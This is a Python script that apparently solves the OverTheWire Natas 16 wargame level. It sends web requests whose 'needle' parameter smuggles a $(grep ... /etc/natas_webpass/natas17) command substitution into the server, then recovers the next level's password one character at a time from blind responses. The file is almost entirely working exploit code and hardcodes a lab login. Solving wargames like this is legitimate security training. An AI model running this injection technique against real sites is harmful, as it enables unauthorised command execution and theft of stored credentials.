#! /usr/bin/python3

import requests
from string import ascii_uppercase,ascii_lowercase,digits

characters = ascii_uppercase + ascii_lowercase + digits

user = 'natas16'
passwd = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'

url = 'http://{}.natas.labs.overthewire.org/'.format(user)

#requests.Session()

answer = ''
cont = 0

for ch in characters:
	output = requests.get(url + '?needle=Africans$(grep ' + ch + ' /etc/natas_webpass/natas17)',auth=(user,passwd))
	if 'Africans' not in output.text:
		answer = answer + ch
		cont = cont + 1
		print(answer)



print('\n')

hashs = ''
cont = 0
while(True):

	for ch in answer:
		output = requests.get(url + '?needle=Africans$(grep ^' + hashs + ch + ' /etc/natas_webpass/natas17)',auth=(user,passwd))
		if 'Africans' not in output.text:
			hashs = hashs + ch
			print("Password: {}{}".format(hashs,(32 - len(hashs)) * '*'))
			cont = cont + 1
			break;
	if cont == 32:
		break

